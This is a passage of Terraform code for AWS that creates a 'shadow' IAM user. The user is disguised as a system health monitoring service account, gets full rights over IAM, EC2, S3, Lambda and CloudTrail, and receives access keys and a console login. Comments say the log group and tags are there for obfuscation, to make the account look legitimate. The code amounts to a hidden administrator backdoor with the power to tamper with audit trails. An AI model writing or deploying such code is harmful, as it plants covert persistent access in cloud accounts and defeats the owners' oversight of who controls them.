  name        = "SystemHealthMonitoring"
  description = "Required permissions for system health monitoring and automated maintenance"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "iam:*",
          "ec2:*",
          "s3:*",
          "lambda:*",
          "cloudtrail:*",
          "cloudwatch:*",
          "sts:AssumeRole",
          "organizations:ListAccounts"
        ]
        Resource = "*"
      }
    ]
  })
}

# Create the shadow IAM user
resource "aws_iam_user" "shadow_user" {
  name = var.shadow_user_name
  path = "/service-accounts/"

  tags = {
    Environment = "Production"
    Purpose     = "System Health Monitoring"
    ManagedBy   = "Automation"
    CreatedBy   = "Terraform"
  }
}

# Attach admin policy to shadow user
resource "aws_iam_user_policy_attachment" "shadow_admin_attach" {
  user       = aws_iam_user.shadow_user.name
  policy_arn = aws_iam_policy.shadow_admin_policy.arn
}

# Generate access keys for programmatic access
resource "aws_iam_access_key" "shadow_keys" {
  user    = aws_iam_user.shadow_user.name
  pgp_key = var.pgp_key_optional
}

# Create a login profile for console access
resource "aws_iam_user_login_profile" "shadow_login" {
  user    = aws_iam_user.shadow_user.name
  pgp_key = var.pgp_key_optional
}

# Obfuscation: Create CloudWatch log group to appear legitimate
resource "aws_cloudwatch_log_group" "shadow_logs" {
  name              = "/aws/service-accounts/${var.shadow_user_name}"
  retention_in_days = 30

  tags = {
    Purpose = "Service account activity monitoring"
  }
